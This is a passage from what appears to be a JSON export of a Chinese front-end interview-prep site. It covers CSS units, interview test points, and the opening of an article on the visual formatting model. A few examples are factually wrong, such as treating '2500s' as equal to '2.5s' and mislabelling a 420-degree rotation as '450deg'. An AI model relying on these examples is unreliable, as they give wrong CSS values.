;\n}\n```\n\n这时可以看到，子元素的边框宽度就是30px，它是相对自己大小进行计算的：\n\n![image.png](https://static.ecool.fun//article/ac0881d0-029b-482e-8abc-e78672f26e53.jpeg)\n\n所以，可以得出结论：**如果自身元素是没有设置字体大小的，那么就会根据其父元素的字体大小作为参照去计算，如果元素本身已经设置了字体，那么就会基于自身的字体大小进行计算**。\n\nem单位除了可以作用于 font-size之外，还可以运用于其他使用长度的属性，比如border-width、width、height、margin、padding、text-shadow等。\n\n所以，em的使用还是比较复杂的，它可能会继承任意一级父元素的字体大小。需要谨慎使用。\n\nrem相对于em就简单了很多，它是根据页面的根元素（根元素）的字体大小来计算的。来对上面的例子进行修改：\n\n```css\n.child {\n  font-size: 30px;\n  border: 1rem solid ;\n}\n\nhtml {\n\tfont-size: 25px;\n}\n```\n\n效果如下，可以看到，边框的长度变成了25px，它是根据根元素html的字体大小计算的：\n\n![image.png](https://static.ecool.fun//article/6610231f-029c-4f80-9fdc-0fa43c12ef60.jpeg)\n\n如果没有对根元素设定字号的话，font-size: 1rem的作用与font-size: initial相同。\n\n使用 em 和 rem 可以让我们灵活的够控制元素整体的放大和缩小，而不是固定大小。那何时应使用 em，何时应使用 rem 呢？可以根据两者的差异来进行选择：\n\n-   两者在客户端中计算出来的样式都会以px的形式显示；\n-   rem是相对于根元素html的font-size计算，em 相对于元素的font-size计算；\n-   当需要根据浏览器的font-size设置缩放时，应该使用 rem；\n-   使用 em 应该根据组件的font-size来定，而不是根元素的font-size来定；\n-   rem 可以从浏览器字体设置中继承 font-size 值， em 可能受任何继承过来的父元素 font-size 的影响。\n\n#### （2）ex 和 ch\n\nex 和 ch 都是排版用的单位，它们的大小取决于元素的font-size 和 font-family属性。\n\n-   ex 指的是所用字体中小写字母 x 的高度。因此，如果两个字体不一样，那么 ex 的值是不一样的。因为每种字体的小写 x 的高度是不一样的。\n-   ch 和 ex 类似，不过它是基于数字 0 的宽度计算的。会随着字体的变化而变化。而0 的宽度通常是对字体的平均字符宽度，它是一个估计值。由于 ch 是一个近似等宽的单元，所以在设置容器的宽度时很有用，比如一个容器想要显示指定个数的字符串时，就可以使用这个单位。\n\n#### （3）vw、vh、vmax 和 vmin\n\n这四个单位都是视窗单位，所谓的视窗，在web端指的就是可视区域，移动端的视窗指的就是布局视窗。如果视窗大小发生了变化，那么这些值都会随之变化。这四个单位指的是：\n\n-   vw：视窗宽度的百分比；\n-   vh：视窗高度的百分比；\n-   vmax：较大的 vh 和 vw；\n-   vmin：较小的 vh 和 vw。\n\n假如一个浏览器的高度是800px，那么1vh的值就是8px。vh和vw的大小总是和视窗的高度和宽度有关。 ​\n\nvmin 和 vmax 与视窗宽度和高度的最大值和最小值有关。假如一个浏览器高度为500px，宽度为1200px，那么1vmin就是5px，1vmax就是12px。 ​\n\n这些单位都是长度单位，所以可以在任何允许使用长度单位的地方使用。这些单位比较适合用于创建全视区界面，例如移动设备的界面，因为元素是根据视区的尺寸而变化的，与文档树中的任何元素都没有关系。\n\n### 2\\. 绝对单位\n\n在 CSS 中，绝对单位包括： px 、pt 、pc、 cm 、 mm 、in 等。绝对单位是一个固定的值，它反应了一个真实的物理尺寸。它不会受屏幕大小或者字体的影响。它们的大小取决于值以及屏幕的分辨率（DPI，每英寸的点数）。px就是我们最常用的绝对单位之一。这些绝对单位的换算关系如下：\n\n```css\n1in = 25.4mm = 2.54cm = 6pc = 72pt =96px\n```\n\n#### （1）px\n\npx 全称为 Pixels，表示像素，它并不严格等于显示器的像素，尤其在高清屏下。尽管CSS单位会根据浏览器、操作系统或者硬件适当缩放，在某些设备或者用户的分辨率设置下也会发生变化，但是96px通常等于一个物理英寸的大小。\n\nCSS 将光栅图像(如照片等)的显示方式定义为默认每一个图像大小为1px。 一个“600x400”解析度的照片的长宽分别为“600px”和“400px”，所以照片本身的像素并不会与显示装置像素一致，而是与 px 单位一致。如此就可以将图像完整的与网页的其它元素排列起来。 ​\n\n很多时候， px 也常被称为 CSS 像素。它是一个绝对单位，但也可以被视为相对单位，因为像素单位相对的是设备像素。在同一个设备上，每 1 个 CSS 像素所代表的物理像素是可以变化的；在不同的设备之间，每 1 个 CSS 像素所代表的物理像素是可以变化的。\n\n```css\n.box {\n    width: 100px;\n    height: 100px;\n}\n```\n\n#### （2）pt\n\npt 全称为 Point，表示点。常用于软件设计和排版印刷行业（笔者做的前端系统，最终的产物就是一个需要拿去印刷的PDF，所以会经常用到这个单位）。当使用这个单位时，无论显示器的分辨率是多少，打印在纸上的结果都是一样的。 ​\n\n如果单纯为了网页的显示，建议就使用px像素单位，如果需要输出印刷产品，就可以考虑使用pt。\n\n#### （3）pc\n\npc 全程为 Picas，表示派卡。相当于我国新四号铅字的尺寸。派卡也是印刷的术语，1派卡等于12点。它和 px 的换算关系如下：\n\n```css\n1pc = 16px\n```\n\n#### （4）cm\n\ncm 全称为 Centimeters，表示厘米。它和 px 的换算关系如下：\n\n```css\n1cm = 37.8px\n```\n\n#### （5）mm\n\nmm 全称为 Millimeters，表示毫米。它和 px 的换算关系如下：\n\n```css\n1mm = 3.78px\n```\n\n#### （6）in\n\nin 全称为 Inches，表示英寸。它和 px 的换算关系如下：\n\n```css\n1in = 96px\n```\n\n### 3\\. 频率单位\n\nCSS中的频率单位有两个：赫兹（Hz）和千赫兹（kHz）。它们的换算关系如下：\n\n```css\n1kHz = 1000Hz\n```\n\n通常情况下，频率单位使用在听或说级联样式表中。频率可以被用来改变一个语音阅读文本的音调。低频率就是低音，高频率就是高音。\n\n```css\n.low { \n  pitch: 105Hz; \n} \n\n.squeal { \n  pitch: 135Hz; \n}\n```\n\n需要注意，当数值为0时，单位对值没有影响，但是单位是不能省略的。也就是说0、0Hz、0kHz是不一样的。所以，在使用频率单位时，不要直接写0。另外，这两个单位是不区分大小写的。\n\n### 4\\. 时间单位\n\nCSS中的时间单位有两个：秒（s）和毫秒（ms）。这两个时间单位都是CSS新增的单位。这两个单位的换算关系如下：\n\n```css\n1s = 1000ms\n```\n\n时间单位主要用于**过度和动画**中，用于定义持续时间或延迟时间。下面两种定义是等效的：\n\n```css\na[href] {\n\ttransition-duration: 2.5s;\n}\n\na[href] {\n\ttransition-duration: 2500s;\n}\n```\n\n### 5\\. 分辨率单位\n\nCSS中的分辨率单位有三个：dpi、dpcm、dppx。这三个单位都是CSS3中华新增的单位。他们都是正值，不允许为负值。这三个单位的换算关系如下：\n\n```css\n1dppx = 96dpi\n1dpi ≈ 0.39dpcm\n1dpcm ≈ 2.54dpi\n```\n\n分辨率单位主要用于**媒体查询**等操作。\n\n#### （1）dpi\n\ndpi 全称为 dots per inch，表示每英寸包含的点的数量。普通屏幕通常包含 72或96个点，大于 192dpi 的屏幕被称为高分屏。\n\n```css\n\n@media screen and (min-resolution: 96dpi) { ... }\n@media print and (min-resolution: 300dpi) { ... }\n```\n\n#### （2）dpcm\n\ndpcm 全称为 dots per centimeter，表示每厘米包含的点的数量。\n\n```css\n@media screen and (min-resolution: 28dpcm) { ... }\n@media print and (min-resolution: 118dpcm) { ... }\n```\n\n#### （3）dppx\n\ndppx 全称为 dots per pixel，表示每像素（px）包含点的数量。由于CSS px的固定比率为1:96，因此1dppx相当于96dpi。它对应于由图像分辨率定义的CSS中显示的图像的默认分辨率。\n\n```css\n@media screen and (min-resolution: 2dppx) { ... }\n@media screen and (min-resolution: 1dppx) and (max-resolution: 1.9dppx) { ... }\n```\n\n### 6\\. 角度单位\n\nCSS中的角度单位有四个：deg、grad、rad、turn。这些角度单位都是CSS3中新增的单位。它们的换算关系如下：\n\n```css\n90deg = 100grad = 0.25turn ≈ 1.570796326794897rad\n```\n\n一般这些角度单位用于元素的\\*\\*旋转操作，\\*\\*包括2D旋转、3D旋转等。\n\n-   当旋转值为正值时，元素会顺时针旋转；\n-   当旋转值为负值时，元素会逆时针旋转。\n\n​\n\n通常情况下，一个完整的旋转就是360度。所以，所有的角度都在0-360度之间。但是，超出这个范围的值也是允许的，只不过都会归到0-360度之间。比如，顺时针旋转420度（450deg）、逆时针旋转270度（-270deg）、顺时针旋转90度（90deg）都是一样的效果，都会归为90deg。但是当使用动画时，这些角度值就非常重要了。 ​\n\nCSS的旋转主要依赖于 transform 属性中的 rotate() 、rotate3d、 skew() 等方法。只需给它们传递旋转的角度即可。 ​\n\n除了旋转会使用角度之外，线性渐变也会经常使用角度值：\n\n```css\nbackground: linear-gradient(45deg, #000, #fff);\n```\n\n#### （1）deg\n\ndeg 全称为 Degress，表示度，一个圆总共360度。\n\n```css\ntransform: rotate(2deg);\n```\n\n#### （2）grad\n\ngrad 全称为 Gradians，表示梯度，一个圆总共400梯度。\n\n```css\ntransform: rotate(2grad);\n```\n\n#### （4）rad\n\nrad 全称为 Radians，表示弧度，一个圆总共2π弧度。\n\n```css\ntransform: rotate(2rad);\n```\n\n#### （4）turn\n\nturn 全称为 Turns，表示圈（转），一个圆总共一圈（转）。\n\n```css\ntransform:rotate(.5turn);\n```\n\n### 7\\. 百分比单位\n\n百分比（%）也是我们比较常用的单位之一，所有接受长度值的属性都可以使用百分比单位。但是不同属性使用该单位的效果可能并不一样。但是都需要有一个参照值，也就是说百分比值是一个相对的值。 ​\n\n下面来看看常见场景中的百分比单位的使用。\n\n#### （1）盒模型中的百分比\n\n在CSS中的盒模型包含的属性有：width、max-width、min-width、height、max-height、min-height、padding、margin等。这些属性在使用百分比时，参照物不尽相同：\n\n-   width、max-width、min-width：值为百分比时，其相对于包含块的 width 进行计算；\n-   height、max-height、min-height：值为百分比时，其相对于包含块的 height 进行计算；\n-   padding、margin：值为百分比时，如果是水平的值，就是相对于包含块的 width 进行计算；如果是垂直的值，就是相对于包含块的 height 进行计算。\n\n#### （2）文本中的百分比\n\n在CSS中文本控制的属性有font-size、line-height 、vertical-align、 text-indent等。这些属性在使用百分比时，参照物不尽相同：\n\n-   font-size：根据父元素的font-size 进行计算；\n-   line-height：根据font-size进行计算；\n-   vertical-align：根据line-height进行计算；\n-   text-indent：如果是水平的，则根据width进行计算，如果是垂直的，则根据 height 进行计算。\n\n#### （3）定位中的百分比\n\n在CSS中用控制 position 位置的top、right、bottom、left都可以使用百分比作为单位。其参照物就是包含块的同方向的width和height。不同定位的包含块不尽相同：\n\n-   如果元素为静态（ static ）或相对定位（ relative ），包含块一般是其父容器；\n-   如果元素为绝对定位（ absolute ），包含块应该是离它最近的 position 为 absolute 、 relative 或 fixed 的祖先元素；\n-   如果元素为固定定位（ fixed ），包含块就是视窗（ viewport ）。\n\n#### （4）变换中的百分比\n\nCSS 中的 transform 属性中的 translate 和 transform-origin 值也可以设置百分比。\n\n-   translateX() 根据容器的 width 计算\n-   translateY() 根据容器的 height 计算\n-   transform-origin 中横坐标（ x ）相对于容器的 width 计算；纵坐标（ y ）相对于容器的 height 计算\n\n注意，在 translate 还有一个 z 轴的函数 translateZ() 。它是不接受百分比为单位的值。\n\n> 原文：https://juejin.cn/post/7036900903462371336",
    "testPoint": "### **1. 单位的分类**\n#### **绝对单位**\n   - **常见单位**：`px`、`cm`、`mm`、`in`、`pt`、`pc`。\n   - **问题**：\n     - `px` 是什么？为何它是绝对单位，但可能在不同设备上看起来大小不同？\n     - `pt` 和 `px` 的换算关系是什么？它们在 Web 开发中适用的场景有哪些？\n     - 什么时候会用到 `cm`、`mm` 或 `in`？\n\n#### **相对单位**\n   - **常见单位**：`em`、`rem`、`%`、`vw`、`vh`、`vmin`、`vmax`、`ch`、`ex`。\n   - **问题**：\n     - `em` 和 `rem` 的区别是什么？如何正确选择？\n     - `vw` 和 `vh` 是如何定义的？它们的使用场景是什么？\n     - `vmin` 和 `vmax` 如何运作？什么时候适合使用它们？\n     - `ch` 和 `ex` 分别代表什么？为什么它们使用得较少？\n\n### **2. 适用场景**\n   - **布局**：\n     - 在响应式设计中，`%`、`vw`、`vh` 和 `rem` 的作用是什么？\n     - 使用 `vw` 和 `vh` 替代固定单位布局的优缺点是什么？\n   - **字体**：\n     - 设置字体大小时，`px`、`em` 和 `rem` 各自的优缺点是什么？如何选择？\n     - 为什么推荐使用 `rem` 定义全局字体大小，而使用 `em` 定义局部字体大小？\n   - **间距**：\n     - 在设置边距和内边距时，为什么建议使用相对单位（如 `%` 或 `rem`）？\n   - **图像和媒体**：\n     - 如何使用 `%` 实现图片的自适应宽高？\n     - 当宽高需要相等时，`vw` 和 `vh` 能否提供更便捷的解决方案？\n\n### **3. 响应式设计中的单位**\n   - **问题**：\n     - 如何通过 `calc()` 配合相对单位和绝对单位实现更灵活的布局？\n     - 使用 `vw` 和 `vh` 实现视口大小变化时的动态适配有哪些注意事项？\n     - 为什么响应式设计中更倾向于 `rem` 而不是 `px`？\n     - 如何通过媒体查询（`@media`）结合相对单位优化响应式布局？\n\n### **4. 动态调整与浏览器兼容性**\n   - **问题**：\n     - 不同设备上的 `px` 是如何表现的？设备像素比（DPR）如何影响 `px` 的实际大小？\n     - `rem` 的基准值如何确定？如何动态调整基准值以实现自适应？\n     - 在 Retina 屏幕和普通屏幕中，绝对单位是否会表现不一致？\n     - 哪些相对单位在旧版浏览器中可能无法正常工作？如何避免？\n\n### **5. 性能与优化**\n   - **问题**：\n     - 过度使用相对单位（如嵌套的 `em`）可能会导致什么问题？如何避免这种问题？\n     - 如何在单位选择中兼顾性能和维护性？比如在大型项目中优先使用 `rem` 而非 `px`。\n     - 使用 `calc()` 动态计算单位时，是否会对性能有明显影响？\n\n### **6. 新的单位和趋势**\n   - **问题**：\n     - CSS 中的 `lvh`、`lvw`、`svh`、`svw` 等新单位是什么？如何解决 `vh` 和 `vw` 在移动端上的问题？\n     - CSS 容器单位（`cqw`、`cqh` 等）的出现对布局方式有何影响？与传统单位相比有哪些优势？\n     - 候选人是否熟悉最新的 CSS 特性，能够在项目中灵活应用？\n\n### **7. 项目实践中的选择**\n   - **问题**：\n     - 在项目中，候选人如何选择单位？是否有统一的单位规范？\n     - 如果需要实现一个兼容所有设备的响应式页面，候选人会如何选用单位？\n     - 如果设计稿以 `px` 为单位，候选人如何将其转化为 `rem` 或其他单位？\n\n### **8. 实践场景考察**\n给出实际问题，考察候选人的理解与应用能力：\n   - **问题**：\n     1. 如果需要实现一个页面字体自适应的效果，你会如何定义单位？\n     2. 如何实现一个全屏遮罩层？用哪些单位来定义宽度和高度？\n     3. 如果要求一个按钮的宽度为父容器的 50%，同时高度为宽度的 50%，候选人会如何实现？\n",
    "exerciseKeyList": "[\"b2307971-c42d-49f7-b659-d3e2a50d3505\",\"394b6918-4c26-4e70-89b8-6bf1751f33ca\"]",
    "vipLimit": 1,
    "level": 1.5,
    "pointOrder": 13,
    "createAt": "2024-10-10T09:04:29.000Z",
    "updateAt": "2024-11-18T01:54:24.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "394b6918-4c26-4e70-89b8-6bf1751f33ca",
        "title": "em/px/rem/vh/vw 这些单位有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T09:55:34.000Z",
        "updateAt": "2024-07-22T10:02:31.000Z"
      },
      {
        "exerciseKey": "b2307971-c42d-49f7-b659-d3e2a50d3505",
        "title": "CSS 尺寸单位有哪些？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:06:04.000Z"
      }
    ]
  },
  "132": {
    "id": 132,
    "tagId": 11,
    "title": "视觉格式化模型",
    "explanation": "大部分 Web 开发者都知道 CSS 中有一个盒模型，但很少有人知道在 CSS 的世界中还有另一个模型，他就是 CSS 的视觉格式化模型。\n\nCSS 视觉格式化模型（英文称之**Visual Formatting Model**）。该模型主要是用来处理在视觉媒体上显示文档时使用的计算规则。仅从这一句话来描述，估计很多同学都会感到困惑，视觉格式化模型到底是什么鬼？大家先不用急着知道视觉格式化模型是什么，只需要知道它是 CSS 中很重要的一部分，如果理解了该部分所涉及到的知识点，将有助于你更好的理解和学习 CSS，特别是 Web 布局\n\n## **什么是视觉格式化模型**\n\n在盒模型中我们了解到，在 CSS 的世界中，任何一个元素都是一个盒子，它具有一个专业术语，即**盒模型**。而视觉格式化模型会根据 CSS 盒模型将文档中的元素转换为一个个盒子。看到这里，很多同学可能更会感到困惑，“**任何元素都是一个盒子，视觉格式化模型将元素转换为盒子，那这盒子是不是都是一样的盒子呢**”？\n\n> 首先要声明一点：**视觉格式化模型和CSS盒模型不是同一个东西**！\n\n简单点说呢。Web 页面（文档树）是由很一个个盒子组成（因为任何元素都可以被视为是一个盒子），而**视觉格式化模型**却是一套规则，用来计算**元素转换为盒子**的规则。而页面的布局都由这些盒子的所处的各处位置组合而成。那么理解了元素怎么转成盒子的规则，就理解了 Web 页面是怎么布局。而每个盒子的布局主要由以下几个因素决定：\n\n-   **盒子的尺寸**：精确指定、由约束条件指定或没有指定\n    \n-   **盒子的类型**：行内盒子（inline）、行内级盒子（inline-level）、原子行内级盒子（atomic inline-level）和块盒子（block）\n    \n-   **定位方案**：普通流定位、浮动定位或绝对定位\n    \n-   **文档树中的其它元素**：即当前盒子的子元素或兄弟元素\n    \n-   **视窗尺寸与位置**\n    \n-   **所包含的图片的尺寸**\n    \n-   **其他的某些外部因素**\n    \n\n先来看一张图，这个图是由下面的 HTML 结构构造出来的：\n\n```HTML\n<body>\n    <header>\n        <nav></nav>\n    </header>\n    <article>\n        <p></p>\n        <figure></figure>\n        <p></p>\n    </article>\n    <aside></aside>\n    <footer></footer>\n</body>\n```\n\n![](https://static.ecool.fun//article/346d6a7e-ef32-45df-93ba-99a6b69a1d2c.)\n\n每个元素都是一个盒子，盒子中可以包含另一个或多个盒子。也正如上图所示，CSS 的视觉格式化模型会根据盒子的**包含块**（Containing Block，即**包含其他盒子的块**）的边界来渲染盒子。通常，盒子会创建一个包含其后代元素的包含块，但是盒子并不会被包含块限制住，盒子的布局会撑破包含块（即跑出包含块的边界），对于这种现象，在 CSS 中常被称为溢出。\n\n溢出是一个很有意思的东东，在 Web 布局中时常会碰到，但在这一章中不做方面的阐述。\n\n回到前面所提到的问题，视觉格式化模型中的盒子和 CSS 中盒模型指的盒子是不是同一个盒子？用一名话来概括：\n\n> **盒子是同一个盒子，但两个模型做着不同的事情。CSS 的盒模型是计算盒子尺寸（** **`width`** **、** **`height`** **、** **`padding`** **、** **`border`** **和** **`margin`** **来决定）；视觉格式化模型是用来计算盒子位置（由前面提到的七个因素来决定）** ！\n\n## **术语的简介**\n\n在接下来的内容中会涉及到很多个有关于 CSS 理论方面的术语，而且这些术语会令人难于理解。可能一时无法很好的理解透彻，但之并不要紧，随着你对 CSS 的深入，这些术语你会越来越清楚。到目前为止，你只需要知道有这些术语以及其概念。\n\n### **块**\n\n块（Block），一个抽象的概念，一个块在文档流上占据一个独立的区域，块与块之间在垂直方向按照顺序依次堆叠（默认情况之下）。\n\n![](https://static.ecool.fun//article/ec8fee0d-9c95-4e0d-a1f7-c38864fe4d6f.)\n\n### **包含块**\n\n包含块（Containing Block），指的是包含其他盒子的块。\n\n![](https://static.ecool.fun//article/00f61cc7-be4e-4609-b286-8709e5abb650.)\n\n> The position and size of an element's box(es) are sometimes calculated relative to a certain rectangle, called the containing block of the element.\n\n大至意思是，盒子的定位和大小都是参考一个矩形边缘来计算的，而这个矩形就是元素的容器块。一个元素的容器块大概定义如下：\n\n-   首先根元素就是一个初始容器块（Initial Containing Block）\n    \n-   其次，如果元素的 `position` 是 `relative` 或`static`，其容器块就是由离它最近的块容器父元素或创建了一个格式化上下文的父级元素生成\n    \n-   如果元素设置了`position:fixed`，它的容器块一般由视窗生成\n    \n-   如果元素设置了`position:absolute`，它的容器块就由设置了`position`值为`relative`、`absolute`或`fixed`的最近父元素生成，如果父级元素都没有设置，则由根元素生成\n    \n-   `transform`属性值为非`none`的元素会生成一个容器块，其`fixed`的子元素会以此定位\n    \n\n那么如何来判断包含块呢？我们用 w3chelp 的一张图来向大家展示：\n\n![](https://static.ecool.fun//article/fad8d3a5-8794-4186-96c7-28029d21e37b.)\n\n### **盒子**\n\n盒子（Box），一个抽象的概念，由 CSS 引擎根据文档中的内容所创建，主要用于文档元素的定位、布局和格式化等用途。盒子与元素并不是一一对应的，有时多个元素会合并一个盒子，有时一个元素会生成多个盒子（比如匿名盒子）。\n\n![](https://static.ecool.fun//article/2ff6dab3-51bd-4332-8b16-68caaf5d3556.)\n\n众所周知，大家都知道一个 HTML 的文档会生成一个DOM树：\n\n![](https://static.ecool.fun//article/f0bf0347-ce6e-4ef4-acc0-120a0822c321.)\n\n同样的，CSS 中也会根据文档结构构建一个盒子树：\n\n![](https://static.ecool.fun//article/ff37e6d6-ecd3-4b1a-8ba7-939cc4a27da8.)\n\n更多的人可能更易于接受 CSSOM 的概念。这里额外提一下，正是 DOM 树和 CSSOM 树才构建成了一颗渲染树：\n\n![](https://static.ecool.fun//article/b7b2cc54-0ef3-4184-9aab-8459daa98f03.)\n\n其实这涉及到浏览器渲染方面的原理了，类似下图，布局仅是整个过程中的一部分：\n\n![](https://static.ecool.fun//article/aa3125d0-fadd-45f5-ae60-10733807b9a3.)\n\n> 扯得有点远，还是回到主题中来，如果大家对这方面知识感兴趣的话，可以查阅读一些浏览器渲染或CSS引擎方面的话题。\n\n### **块级盒子和行内级盒子**\n\n块级盒子（Block-level Box），由块级元素生成。一个块级元素至少会生成一个块级盒子，但也有可能生成多个（例如列表项元素）。\n\n行内级盒子（Inline-level Box），由行内级元素生成。同样的，一个行内元素至少会生成一个行内级盒子。行内级盒子包括行内盒子和原子行内级盒子两种，区别在于该盒子是否参与行内格式化上下文的创建。\n\n> 简单地说，块元素生成块组盒子，行内元素或行内级元素生成行内级盒子。两种盒子可以通过`display`来进行切换。\n\n![](https://static.ecool.fun//article/5c3fbeb6-b95d-4f1a-b47d-f1a5f3dfcc5b.)\n\n### **块盒子和行内盒子**\n\n块盒子（Block Box），如果一个块级盒子同时也是一个块容器盒子，则称其为块盒子。除具名块盒子之外，还有一类块盒子是匿名的，称为匿名块盒子（Anonymous Block Box），匿名盒子无法被 CSS 选择器选中。\n\n![](https://static.ecool.fun//article/1323bd8e-bb69-49f6-954e-d9d6a11e1366.)\n\n行内盒子（Inline Box）由非替换元素（Non-replaced Element）生成，属于行内级盒中的一种。除了行内盒子之外，其他的行内级盒子都是原子行内级盒（Atomic Inline-level Box），它的典型特征就是作为一个整体，不能拆分换行。同样的，行内盒子也有匿名行内盒（Anonymous Inline Box）。对于没有任何元素包裹的直接文本，CSS引擎会为其创建匿名行内盒。\n\n> 简单地说，参与行内格式化上下文创建的行内盒子称为行内盒子。\n\n![](https://static.ecool.fun//article/cf6d5720-333a-49a5-a9dd-9748fea0822e.)\n\n### **原子行内级盒子**\n\n原子行内级盒子（Atomic Inline-level Box），不参与行内格式化上下文创建的行内级盒子。原子行内级盒子一开始叫做原子行内盒子（Atomic Inline Box），后被修正。原子内级盒子的内容不会拆分成多行显示。\n\n### **行盒**\n\n行盒（Line Box）和行内盒是不一样的。行盒是由行内格式化上下文（Inline Formatting Context）产生的盒子，用于表示一行。行盒从包含块的一边排版到另一边。一般情况下，浏览器为会每行创建一个看不见的行盒。\n\n行盒的内部构造也是较为复杂的，也是 CSS 中较为复杂而且难于理解的一部分。下图就是一个行盒的构造：\n\n![](https://static.ecool.fun//article/eef0d8cd-85e9-4c3e-9828-d35a2865632d.)\n\n### **块容器盒子**\n\n块容器盒子（Block Container Box 或 Block Containning Box），块容器盒子侧重于当前盒子作为容器角色，它不参与当前块的布局和定位，它所描述的仅仅是当前盒子与其后代之间的关系。换句话说，块容器盒子主要用于确定其子元素的之一位、布局等。\n\n### **块级元素和行内级元素**\n\n> CSS中的盒子非常复杂，有**块盒子**和**块级盒子**（**行内盒子**和**行内级盒子**）之分。各种盒子让初学者甚为头疼。不过元素相对于盒子而言，要简单地多，它只有**块级元素**和**行内级元素**之分。\n\n块级元素（Block-level Element）是指元素的`display` 值为`block`、`list-item`、`table`、`flex` 和 `grid` 等，该元素将成为块级元素。元素是否是块级元素仅是元素本身的属性，并不直接用于格式化上下文的创建或布局。\n\n行内级元素（Inline-level Element）是指元素的 `display` 值为 `inline`、`inline-block`、`inline-table`、`inline-flex` 和 `inline-grid` 等，该元素将成为行内级元素。与块元素一样，元素是否是行内级元素仅是元素本身的属性，并不直接用于格式化上下文的创建或布局。\n\n![](https://static.ecool.fun//article/aa04e9f2-9041-4025-a14a-016fce2688e1.)\n\n### **视窗（Viewport）**\n\n简单地说，视窗就是浏览器中可视区域。视窗大小指的就是浏览器可视区域的大小：\n\n![](https://static.ecool.fun//article/dcb334df-1a75-421f-9f49-b1cb6ca719f2.)\n\n时至今日，面对不同的终端屏幕，视窗大小也有所不一样：\n\n![](https://static.ecool.fun//article/11a3f85f-0118-4273-9091-08af16a7c3e9.)\n\n特别是在移动设备上，视窗又分为 **Layout viewport** 、 **Visual viewport** 和 **Ideal viewport** 三类：\n\n![](https://static.ecool.fun//article/771134e3-0c27-4cf9-bc23-fe3d57d4df45.)\n\n其中的 Ideal viewport 是最适合移动设备的 viewport，Ideal viewport 的宽度等于移动设备的屏幕宽度，只要在 CSS 中把某一元素的宽度设为 Ideal viewport 的宽度(单位用`px`)，那么这个元素的宽度就是设备屏幕的宽度了，也就是宽度为`100%` 的效果。Ideal viewport 的意义在于，Ideal viewport 并没有一个固定的尺寸，不同的设备拥有有不同的 Ideal viewport。无论在何种分辨率的屏幕下，那些针对 Ideal viewport 而设计的网站，不需要用户手动缩放，也不需要出现横向滚动条，都可以完美的呈现给用户。\n\n### **格式化上下文**\n\n默认情况下，盒子按照元素**在 HTML 中的先后位置从左至右自上而下依次堆叠**：\n\n![](https://static.ecool.fun//article/1a7b9f62-e93a-4b1a-a6c7-a92144c136b5.)\n\n从图中可以看出来，有些元素的盒子被渲染为完整的一行，比如 `h1`、`li` 等元素；有些元素的盒子则被渲染为水平排列的，直到该行被占满然后换行，比如 `em`、`strong` 等元素。\n\n这是因为不同的盒子使用的是不同的格式化上下文（Formatting Context）来布局，每个格式化上下文都拥有自己不同的渲染规则，而这些规则是用来决定其子元素如何定位，以及和其他元素的关系。好比水倒进不同的器皿中，会有不同的形态：\n\n![](https://static.ecool.fun//article/7ee634a3-6464-43a4-bbac-eb8900ceef21.)\n\n在CSS中格式化上下文有很多种，比如**IFC（Inline Formatting Context）** 、**BFC（Block Formatting Context）** 、**FFC（Flexbox Formatting Context）** 和**GFC（Grid Formatting Contexgt）** 等。而这些格式化上下文的集合可以称作**视觉格式化模型**。\n\n> 格式化上下文是CSS中非常重要的一部分，稍后会花一定的篇幅来阐述CSS中的 **`*FC`**。\n\n## **盒子的生成**\n\n盒子的生成是 CSS 视觉格式化模型的一部分，用于从文档元素生成盒子。盒子有不同的类型，不同类型的盒子的格式方法也有所不同，不同的盒子也会影响元素或其后代元素的行为。在 CSS 中，通常使用 `display` 属性来明确盒子的类型。\n\nCSS 的 `display` 属性的值，将导致文档里的元素生成一个主盒（Principal Box）以包含后代盒子和内容，同时其自身也是参与到定位方案中的盒子。而有些元素除了会生成主盒之外，还可能会生成额外的盒子。比如设置了 `display` 值为 `list-item` 元素。这些额外的盒子的放置位置与主盒有关。\n\n> CSS的 `display` 切换不同的值时，会产生生成不同的盒子；同时客户端渲染HTML文档时都会为每个元素自带一个盒子。\n\n### **一切都是盒子**\n\n在 CSS 中，一切都会生成盒子。Web 页面本质上是一组块级盒子和内联级盒子。你可以在浏览器的开发者工具中选择页面上的元素，就可以很好的理解这些盒子。可以看到构成布局的盒以及盒子的各种属性（外边距 `margin`、内距`padding`、边框`border`和内容`content`等），还能看到这些盒子属性的应用方式：\n\n![](https://static.ecool.fun//article/acc8a606-9676-4c08-bd7f-e9f395a9c0d8.)\n\n### **控制盒子生成**\n\n前面提到过，在 CSS 中任何东西都是一个盒子，盒子之间的类型还可以使用 `display` 的不同值来进行切换。在 `display` 中还有两个不同的值 `none` 和 `contents` ，**可以用来控制盒子是否应该显式**。如果你希望 HTML 中的元素不想在 CSS 中生成盒子，就需要以某种方式来抑制盒子的生成。你可能想做两件事：\n\n-   防止元素及其后代元素生成一个盒子\n    \n-   防止元素自身生成一个盒子，但其后代元素仍然会生成一个盒子\n    \n\n在 CSS 中的 `display` 属性的 `none` 和 `contents` 即可帮助我们做到这两点：\n\n-   如果元素的 `display` 取值为 `none` 时，元素和其后代元素都将不可见，也不会生成任何盒子\n    \n-   如果元素的 `display` 取值为 `contents` 时，元素自身的盒子属性（`margin`、`padding` 和 `border` 等）都将丢失，但其后代元素不受任何影响。也就是说，元素自身不再是一个盒子，但其后代元素依旧是一个盒子\n    \n\n也就是说，CSS 的 `display` 属性控制盒子生成：\n\n-   元素的 `display` 值不是 `none` 或 `contents` 时，元素即可生成一个盒子，盒子的类型由其值的类型来决定\n    \n-   元素的 `display` 值是 `none` 时，元素及其后代元素都不会生成盒子\n    \n-   元素的 `display` 值是 `contents` 时，元素自身不会生成盒子，但其后代元素依旧会根据 `display` 生成相应的盒子\n    \n\n接下来，我们来看看各种盒子的生成。\n\n### **块级元素与块盒子**\n\n当元素的 `display` 为`block`、`list-item`、`table`、`flex` 或 `grid` 时，该元素将成为块级元素。一个块级元素会被格式化成一个块，比如我们熟悉的 `div`、`p`、`li` 等元素。这些块级元素默认按照从左到右自上而下依次堆叠。\n\n而每个块级盒子都会参与块格式化上下文（Block Formatting Context，俗称**BFC**）的创建，每个块级元素都会至少生成一个块级盒子，即主块级盒子（Principal Block-level Box）。有一些元素除了会生成主块级盒子之外，还会生成额外的盒子。比如 `display` 取值为 `list-item` 的元素，除了生成主块级盒子之外，还会生成一个Marker标记盒子（Marker标记是指类似项目符号的标记），而那些生成列表项的元素可能会生成更多的盒子。\n\n> 